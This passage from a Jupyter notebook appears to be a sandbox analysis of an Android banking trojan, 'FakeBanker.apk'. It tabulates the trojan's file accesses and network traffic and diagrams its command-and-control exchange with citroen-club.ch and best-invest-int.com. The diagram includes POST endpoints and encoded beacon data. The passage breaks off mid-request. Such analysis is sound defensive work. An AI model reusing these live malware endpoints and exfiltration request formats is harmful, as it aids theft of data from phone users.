        "      <td> 0:00:04</td>\n",
        "      <td>  read</td>\n",
        "      <td>                                   /proc/1197/cmdline</td>\n",
        "      <td> logcat\u0000DroidBox:W\u0000dalvikvm:W\u0000ActivityManager:I\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000p/FakeBanker.apk\u0000ain...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>3 </th>\n",
        "      <td> 0:00:08</td>\n",
        "      <td>  read</td>\n",
        "      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>\n",
        "      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\\n&lt;map&gt;\\n&lt;string name=\"DOWNLOADDOMAIN\"&gt;c...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>4 </th>\n",
        "      <td> 0:00:09</td>\n",
        "      <td> write</td>\n",
        "      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>\n",
        "      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\\n&lt;map&gt;\\n&lt;string name=\"DOWNLOADDOMAIN\"&gt;c...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>5 </th>\n",
        "      <td> 0:00:10</td>\n",
        "      <td> write</td>\n",
        "      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>\n",
        "      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\\n&lt;map&gt;\\n&lt;string name=\"DOWNLOADDOMAIN\"&gt;c...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>6 </th>\n",
        "      <td> 0:00:10</td>\n",
        "      <td>  read</td>\n",
        "      <td>                                   /proc/1205/cmdline</td>\n",
        "      <td> com.gmail.xpack:remote\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000p/FakeBanker.apk\u0000ain...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>7 </th>\n",
        "      <td> 0:00:36</td>\n",
        "      <td> write</td>\n",
        "      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>\n",
        "      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\\n&lt;map&gt;\\n&lt;int name=\"PASSADDED\" value=\"10...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>8 </th>\n",
        "      <td> 0:00:36</td>\n",
        "      <td>  read</td>\n",
        "      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>\n",
        "      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\\n&lt;map&gt;\\n&lt;string name=\"DOWNLOADDOMAIN\"&gt;c...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>9 </th>\n",
        "      <td> 0:01:05</td>\n",
        "      <td>  read</td>\n",
        "      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>\n",
        "      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\\n&lt;map&gt;\\n&lt;int name=\"PASSADDED\" value=\"10...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>10</th>\n",
        "      <td> 0:15:06</td>\n",
        "      <td> write</td>\n",
        "      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>\n",
        "      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\\n&lt;map&gt;\\n&lt;int name=\"PASSADDED\" value=\"10...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>11</th>\n",
        "      <td> 0:15:06</td>\n",
        "      <td> write</td>\n",
        "      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>\n",
        "      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\\n&lt;map&gt;\\n&lt;int name=\"PASSADDED\" value=\"10...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>12</th>\n",
        "      <td> 0:15:24</td>\n",
        "      <td>  read</td>\n",
        "      <td>                                         /dev/urandom</td>\n",
        "      <td>                                                                                E0\u0000\ufffd2qV\ufffd\ufffd\ufffd4!=\ufffdNd\ufffd\ufffd\u000fV</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>13</th>\n",
        "      <td> 0:15:27</td>\n",
        "      <td>  read</td>\n",
        "      <td>                                   /proc/1239/cmdline</td>\n",
        "      <td> com.android.exchange\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000p/FakeBanker.apk\u0000ain...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>14</th>\n",
        "      <td> 0:15:35</td>\n",
        "      <td>  read</td>\n",
        "      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>\n",
        "      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\\n&lt;map&gt;\\n&lt;int name=\"PASSADDED\" value=\"10...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>15</th>\n",
        "      <td> 0:15:37</td>\n",
        "      <td> write</td>\n",
        "      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>\n",
        "      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\\n&lt;map&gt;\\n&lt;int name=\"PASSADDED\" value=\"10...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>16</th>\n",
        "      <td> 0:15:37</td>\n",
        "      <td> write</td>\n",
        "      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>\n",
        "      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\\n&lt;map&gt;\\n&lt;int name=\"PASSADDED\" value=\"10...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>17</th>\n",
        "      <td> 0:15:58</td>\n",
        "      <td>  read</td>\n",
        "      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>\n",
        "      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\\n&lt;map&gt;\\n&lt;int name=\"PASSADDED\" value=\"10...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>18</th>\n",
        "      <td> 0:16:00</td>\n",
        "      <td> write</td>\n",
        "      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>\n",
        "      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\\n&lt;map&gt;\\n&lt;int name=\"PASSADDED\" value=\"10...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>19</th>\n",
        "      <td> 0:16:01</td>\n",
        "      <td> write</td>\n",
        "      <td> /data/data/com.gmail.xpack/shared_prefs/MainPref.xml</td>\n",
        "      <td> &lt;?xml version='1.0' encoding='utf-8' standalone='yes' ?&gt;\\n&lt;map&gt;\\n&lt;int name=\"PASSADDED\" value=\"10...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>20</th>\n",
        "      <td> 0:16:10</td>\n",
        "      <td>  read</td>\n",
        "      <td>                                      /proc/wakelocks</td>\n",
        "      <td> name\\tcount\\texpire_count\\twake_count\\tactive_since\\ttotal_time\\tsleep_time\\tmax_time\\tlast_chan...</td>\n",
        "    </tr>\n",
        "  </tbody>\n",
        "</table>\n",
        "</div>"
       ],
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 421,
       "text": [
        "   Timestamp operation                                                  path                                                                                              rawdata\n",
        "0    0:00:03      read  /data/data/com.gmail.xpack/shared_prefs/MainPref.xml  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<string name=\"DOWNLOADDOMAIN\">c...\n",
        "1    0:00:04      read                                    /proc/1184/cmdline  com.gmail.xpack\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000p/FakeBanker.apk\u0000ain...\n",
        "2    0:00:04      read                                    /proc/1197/cmdline  logcat\u0000DroidBox:W\u0000dalvikvm:W\u0000ActivityManager:I\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000p/FakeBanker.apk\u0000ain...\n",
        "3    0:00:08      read  /data/data/com.gmail.xpack/shared_prefs/MainPref.xml  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<string name=\"DOWNLOADDOMAIN\">c...\n",
        "4    0:00:09     write  /data/data/com.gmail.xpack/shared_prefs/MainPref.xml  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<string name=\"DOWNLOADDOMAIN\">c...\n",
        "5    0:00:10     write  /data/data/com.gmail.xpack/shared_prefs/MainPref.xml  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<string name=\"DOWNLOADDOMAIN\">c...\n",
        "6    0:00:10      read                                    /proc/1205/cmdline  com.gmail.xpack:remote\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000p/FakeBanker.apk\u0000ain...\n",
        "7    0:00:36     write  /data/data/com.gmail.xpack/shared_prefs/MainPref.xml  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<int name=\"PASSADDED\" value=\"10...\n",
        "8    0:00:36      read  /data/data/com.gmail.xpack/shared_prefs/MainPref.xml  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<string name=\"DOWNLOADDOMAIN\">c...\n",
        "9    0:01:05      read  /data/data/com.gmail.xpack/shared_prefs/MainPref.xml  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<int name=\"PASSADDED\" value=\"10...\n",
        "10   0:15:06     write  /data/data/com.gmail.xpack/shared_prefs/MainPref.xml  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<int name=\"PASSADDED\" value=\"10...\n",
        "11   0:15:06     write  /data/data/com.gmail.xpack/shared_prefs/MainPref.xml  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<int name=\"PASSADDED\" value=\"10...\n",
        "12   0:15:24      read                                          /dev/urandom                                                                                 E0\u0000\ufffd2qV\ufffd\ufffd\ufffd4!=\ufffdNd\ufffd\ufffd\u000fV\n",
        "13   0:15:27      read                                    /proc/1239/cmdline  com.android.exchange\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000p/FakeBanker.apk\u0000ain...\n",
        "14   0:15:35      read  /data/data/com.gmail.xpack/shared_prefs/MainPref.xml  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<int name=\"PASSADDED\" value=\"10...\n",
        "15   0:15:37     write  /data/data/com.gmail.xpack/shared_prefs/MainPref.xml  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<int name=\"PASSADDED\" value=\"10...\n",
        "16   0:15:37     write  /data/data/com.gmail.xpack/shared_prefs/MainPref.xml  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<int name=\"PASSADDED\" value=\"10...\n",
        "17   0:15:58      read  /data/data/com.gmail.xpack/shared_prefs/MainPref.xml  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<int name=\"PASSADDED\" value=\"10...\n",
        "18   0:16:00     write  /data/data/com.gmail.xpack/shared_prefs/MainPref.xml  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<int name=\"PASSADDED\" value=\"10...\n",
        "19   0:16:01     write  /data/data/com.gmail.xpack/shared_prefs/MainPref.xml  <?xml version='1.0' encoding='utf-8' standalone='yes' ?>\\n<map>\\n<int name=\"PASSADDED\" value=\"10...\n",
        "20   0:16:10      read                                       /proc/wakelocks  name\\tcount\\texpire_count\\twake_count\\tactive_since\\ttotal_time\\tsleep_time\\tmax_time\\tlast_chan..."
       ]
      }
     ],
     "prompt_number": 421
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "Network activities"
     ]
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "Opened connections (opennet)"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# <!-- collapse=True -->\n",
      "# Convert timestamps to human readable time delta\n",
      "timestamps = [str(datetime.timedelta(seconds=(round(float(i.encode(\"utf-8\")))))) for i in result['opennet'].keys()]\n",
      "\n",
      "# Create list of accessed files entries\n",
      "open_net = [i[1] for i in result['opennet'].items()]\n",
      "\n",
      "# Create dataframe\n",
      "df_opennet = pd.DataFrame(open_net, index=timestamps)\n",
      "df_opennet.sort(inplace=True)\n",
      "df_opennet.index.name='Timestamp'\n",
      "\n",
      "\n",
      "#df2table(df_opennet)\n",
      "#ipy_table.apply_theme('basic')\n",
      "df_opennet.reset_index()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "html": [
        "<div style=\"max-height:1000px;max-width:1500px;overflow:auto;\">\n",
        "<table border=\"1\" class=\"dataframe\">\n",
        "  <thead>\n",
        "    <tr style=\"text-align: right;\">\n",
        "      <th></th>\n",
        "      <th>Timestamp</th>\n",
        "      <th>desthost</th>\n",
        "      <th>destport</th>\n",
        "      <th>fd</th>\n",
        "    </tr>\n",
        "  </thead>\n",
        "  <tbody>\n",
        "    <tr>\n",
        "      <th>0</th>\n",
        "      <td> 0:00:08</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> 17</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>1</th>\n",
        "      <td> 0:15:06</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> 23</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>2</th>\n",
        "      <td> 0:15:36</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> 28</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>3</th>\n",
        "      <td> 0:16:00</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> 33</td>\n",
        "    </tr>\n",
        "  </tbody>\n",
        "</table>\n",
        "</div>"
       ],
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 405,
       "text": [
        "  Timestamp      desthost destport  fd\n",
        "0   0:00:08  80.74.128.17       80  17\n",
        "1   0:15:06  80.74.128.17       80  23\n",
        "2   0:15:36  80.74.128.17       80  28\n",
        "3   0:16:00  80.74.128.17       80  33"
       ]
      }
     ],
     "prompt_number": 405
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "Sent data (sendnet)"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Here you can have a look at the sent data. Again: The POST/GET requests are not fully complete. "
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# <!-- collapse=True -->\n",
      "# Convert timestamps to human readable time delta\n",
      "timestamps = [str(datetime.timedelta(seconds=(round(float(i.encode(\"utf-8\")))))) for i in result['sendnet'].keys()]\n",
      "# Create list of accessed files entries\n",
      "send_net = [i[1] for i in result['sendnet'].items()]\n",
      "\n",
      "# Create dataframe\n",
      "df_sendnet = pd.DataFrame(send_net, index=timestamps)\n",
      "df_sendnet.sort(inplace=True)\n",
      "df_sendnet.index.name='Timestamp'\n",
      "\n",
      "# Unhexlify data\n",
      "unhexed_data = [binascii.unhexlify(d) for d in df_sendnet['data']]\n",
      "df_sendnet['rawdata'] = unhexed_data\n",
      "\n",
      "#df2table(df_sendnet[['desthost', 'destport', 'fd', 'operation', 'type', 'rawdata']])\n",
      "#ipy_table.apply_theme('basic')\n",
      "df_sendnet[['desthost', 'destport', 'fd', 'operation', 'type', 'rawdata']].reset_index()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "html": [
        "<div style=\"max-height:1000px;max-width:1500px;overflow:auto;\">\n",
        "<table border=\"1\" class=\"dataframe\">\n",
        "  <thead>\n",
        "    <tr style=\"text-align: right;\">\n",
        "      <th></th>\n",
        "      <th>Timestamp</th>\n",
        "      <th>desthost</th>\n",
        "      <th>destport</th>\n",
        "      <th>fd</th>\n",
        "      <th>operation</th>\n",
        "      <th>type</th>\n",
        "      <th>rawdata</th>\n",
        "    </tr>\n",
        "  </thead>\n",
        "  <tbody>\n",
        "    <tr>\n",
        "      <th>0</th>\n",
        "      <td> 0:00:08</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> 17</td>\n",
        "      <td> send</td>\n",
        "      <td> net write</td>\n",
        "      <td> POST /images/1.php HTTP/1.1\\r\\nUser-agent: Mozilla/4.76 (Java; U;Linux armv7l 2.6.29-gc497e41; r...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>1</th>\n",
        "      <td> 0:15:06</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> 23</td>\n",
        "      <td> send</td>\n",
        "      <td> net write</td>\n",
        "      <td> POST /images/1.php HTTP/1.1\\r\\nUser-agent: Mozilla/4.76 (Java; U;Linux armv7l 2.6.29-gc497e41; r...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>2</th>\n",
        "      <td> 0:15:36</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> 28</td>\n",
        "      <td> send</td>\n",
        "      <td> net write</td>\n",
        "      <td> POST /images/1.php HTTP/1.1\\r\\nUser-agent: Mozilla/4.76 (Java; U;Linux armv7l 2.6.29-gc497e41; r...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>3</th>\n",
        "      <td> 0:16:00</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> 33</td>\n",
        "      <td> send</td>\n",
        "      <td> net write</td>\n",
        "      <td> POST /images/1.php HTTP/1.1\\r\\nUser-agent: Mozilla/4.76 (Java; U;Linux armv7l 2.6.29-gc497e41; r...</td>\n",
        "    </tr>\n",
        "  </tbody>\n",
        "</table>\n",
        "</div>"
       ],
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 404,
       "text": [
        "  Timestamp      desthost destport  fd operation       type                                                                                              rawdata\n",
        "0   0:00:08  80.74.128.17       80  17      send  net write  POST /images/1.php HTTP/1.1\\r\\nUser-agent: Mozilla/4.76 (Java; U;Linux armv7l 2.6.29-gc497e41; r...\n",
        "1   0:15:06  80.74.128.17       80  23      send  net write  POST /images/1.php HTTP/1.1\\r\\nUser-agent: Mozilla/4.76 (Java; U;Linux armv7l 2.6.29-gc497e41; r...\n",
        "2   0:15:36  80.74.128.17       80  28      send  net write  POST /images/1.php HTTP/1.1\\r\\nUser-agent: Mozilla/4.76 (Java; U;Linux armv7l 2.6.29-gc497e41; r...\n",
        "3   0:16:00  80.74.128.17       80  33      send  net write  POST /images/1.php HTTP/1.1\\r\\nUser-agent: Mozilla/4.76 (Java; U;Linux armv7l 2.6.29-gc497e41; r..."
       ]
      }
     ],
     "prompt_number": 404
    },
    {
     "cell_type": "heading",
     "level": 3,
     "metadata": {},
     "source": [
      "Received data (recvnet)"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "# <!-- collapse=True -->\n",
      "# Convert timestamps to human readable time delta\n",
      "timestamps = [str(datetime.timedelta(seconds=(round(float(i.encode(\"utf-8\")))))) for i in result['recvnet'].keys()]\n",
      "\n",
      "# Create list of accessed files entries\n",
      "recv_net = [i[1] for i in result['recvnet'].items()]\n",
      "\n",
      "# Create dataframe\n",
      "df_recvnet = pd.DataFrame(recv_net, index=timestamps)\n",
      "df_recvnet.sort(inplace=True)\n",
      "df_recvnet.index.name='Timestamp'\n",
      "\n",
      "# Unhexlify data\n",
      "unhexed_data = [binascii.unhexlify(d) for d in df_recvnet['data']]\n",
      "df_recvnet['rawdata'] = unhexed_data\n",
      "\n",
      "#df2table(df_recvnet[['host', 'port', 'type', 'rawdata']])\n",
      "#ipy_table.apply_theme('basic')\n",
      "df_recvnet[['host', 'port', 'type', 'rawdata']].reset_index()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "html": [
        "<div style=\"max-height:1000px;max-width:1500px;overflow:auto;\">\n",
        "<table border=\"1\" class=\"dataframe\">\n",
        "  <thead>\n",
        "    <tr style=\"text-align: right;\">\n",
        "      <th></th>\n",
        "      <th>Timestamp</th>\n",
        "      <th>host</th>\n",
        "      <th>port</th>\n",
        "      <th>type</th>\n",
        "      <th>rawdata</th>\n",
        "    </tr>\n",
        "  </thead>\n",
        "  <tbody>\n",
        "    <tr>\n",
        "      <th>0</th>\n",
        "      <td> 0:00:08</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> net read</td>\n",
        "      <td> HTTP/1.1 406 Not Acceptable\\r\\nDate: Mon, 28 Jul 2014 13:29:38 GMT\\r\\nServer: Apache\\r\\nContent-...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>1</th>\n",
        "      <td> 0:00:08</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> net read</td>\n",
        "      <td> x=10\\r\\nConnection: Keep-Alive\\r\\nContent-Type: text/html; charset=iso-8859-1\\r\\n\\r\\n&lt;!DOCTYPE H...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>2</th>\n",
        "      <td> 0:15:06</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> net read</td>\n",
        "      <td> x=10\\r\\nConnection: Keep-Alive\\r\\nContent-Type: text/html; charset=iso-8859-1\\r\\n\\r\\n&lt;!DOCTYPE H...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>3</th>\n",
        "      <td> 0:15:06</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> net read</td>\n",
        "      <td> HTTP/1.1 406 Not Acceptable\\r\\nDate: Mon, 28 Jul 2014 13:44:36 GMT\\r\\nServer: Apache\\r\\nContent-...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>4</th>\n",
        "      <td> 0:15:36</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> net read</td>\n",
        "      <td> HTTP/1.1 406 Not Acceptable\\r\\nDate: Mon, 28 Jul 2014 13:45:06 GMT\\r\\nServer: Apache\\r\\nContent-...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>5</th>\n",
        "      <td> 0:15:36</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> net read</td>\n",
        "      <td> x=10\\r\\nConnection: Keep-Alive\\r\\nContent-Type: text/html; charset=iso-8859-1\\r\\n\\r\\n&lt;!DOCTYPE H...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>6</th>\n",
        "      <td> 0:16:00</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> net read</td>\n",
        "      <td> HTTP/1.1 406 Not Acceptable\\r\\nDate: Mon, 28 Jul 2014 13:45:30 GMT\\r\\nServer: Apache\\r\\nContent-...</td>\n",
        "    </tr>\n",
        "    <tr>\n",
        "      <th>7</th>\n",
        "      <td> 0:16:00</td>\n",
        "      <td> 80.74.128.17</td>\n",
        "      <td> 80</td>\n",
        "      <td> net read</td>\n",
        "      <td> x=10\\r\\nConnection: Keep-Alive\\r\\nContent-Type: text/html; charset=iso-8859-1\\r\\n\\r\\n&lt;!DOCTYPE H...</td>\n",
        "    </tr>\n",
        "  </tbody>\n",
        "</table>\n",
        "</div>"
       ],
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 403,
       "text": [
        "  Timestamp          host port      type                                                                                              rawdata\n",
        "0   0:00:08  80.74.128.17   80  net read  HTTP/1.1 406 Not Acceptable\\r\\nDate: Mon, 28 Jul 2014 13:29:38 GMT\\r\\nServer: Apache\\r\\nContent-...\n",
        "1   0:00:08  80.74.128.17   80  net read  x=10\\r\\nConnection: Keep-Alive\\r\\nContent-Type: text/html; charset=iso-8859-1\\r\\n\\r\\n<!DOCTYPE H...\n",
        "2   0:15:06  80.74.128.17   80  net read  x=10\\r\\nConnection: Keep-Alive\\r\\nContent-Type: text/html; charset=iso-8859-1\\r\\n\\r\\n<!DOCTYPE H...\n",
        "3   0:15:06  80.74.128.17   80  net read  HTTP/1.1 406 Not Acceptable\\r\\nDate: Mon, 28 Jul 2014 13:44:36 GMT\\r\\nServer: Apache\\r\\nContent-...\n",
        "4   0:15:36  80.74.128.17   80  net read  HTTP/1.1 406 Not Acceptable\\r\\nDate: Mon, 28 Jul 2014 13:45:06 GMT\\r\\nServer: Apache\\r\\nContent-...\n",
        "5   0:15:36  80.74.128.17   80  net read  x=10\\r\\nConnection: Keep-Alive\\r\\nContent-Type: text/html; charset=iso-8859-1\\r\\n\\r\\n<!DOCTYPE H...\n",
        "6   0:16:00  80.74.128.17   80  net read  HTTP/1.1 406 Not Acceptable\\r\\nDate: Mon, 28 Jul 2014 13:45:30 GMT\\r\\nServer: Apache\\r\\nContent-...\n",
        "7   0:16:00  80.74.128.17   80  net read  x=10\\r\\nConnection: Keep-Alive\\r\\nContent-Type: text/html; charset=iso-8859-1\\r\\n\\r\\n<!DOCTYPE H..."
       ]
      }
     ],
     "prompt_number": 403
    },
    {
     "cell_type": "heading",
     "level": 2,
     "metadata": {},
     "source": [
      "Requests sequence"
     ]
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Since I was not able to get the full contents of the POST/GET requests (and their equivalent responses), I had to rely on the information found [here](http://www.apk-analyzer.net/analysis/646/3752/0/html). Below is a short sequence diagramm describing the general process of the communication. Keep in mind that the sequence only tries to give you a short overview of the data exchange between the process and the webserver. "
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "%%seqdiag\n",
      "# <!-- collapse=True -->\n",
      "seqdiag {\n",
      "  application  -> citroen-club.ch [label = \"POST /images/1.php HTTP/1.1\"];\n",
      "  application <-- citroen-club.ch [label = \"HTTP/1.1 406 Not Acceptable\", leftnote= \"\"];\n",
      "  application --> best-invest-int.com [label = \"POST /gallery/3.php HTTP/1.1\", note = \"POST data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&rid=25\"];\n",
      "  application <-- best-invest-int.com [label = \"HTTP/1.1 403 Forbidden\"];\n",
      "  application --> best-invest-int.com [label = \"POST /gallery/4.php HTTP/1.1\", note = \"POST data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&LogCode=CONF&LogText=Get+config+data+from+server\"];\n",
      "  application <-- best-invest-int.com [label = \"HTTP/1.1 403 Forbidden\"];\n",
      "  application --> best-invest-int.com [label = \"POST /gallery/4.php HTTP/1.1\", note = \"POST data=U2ltU3RhdGUgPSBOT1QgUkVBRFkgCg%3D%3D%0A&LogCode=DATA&LogText=Send+data+to+server&\"];\n",
      "  application <-- best-invest-int.com [label = \"...\"];\n",
      "}\n"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "display_data",
       "png": "[encoded data removed]"
      }
     ],
     "prompt_number": 73
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "And now a complete request/response pair:\n",
      "\n",
      "**Request**:\n",
      "\n",
      "~~~ \n",
      "POST /gallery/4.php HTTP/1.1\n",
      "User-agent: Mozilla/4.76 (Java; U;Linux i686 3.0.36-android-x86-eeepc+; ru; The Android Project 0)\n",
      "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n",
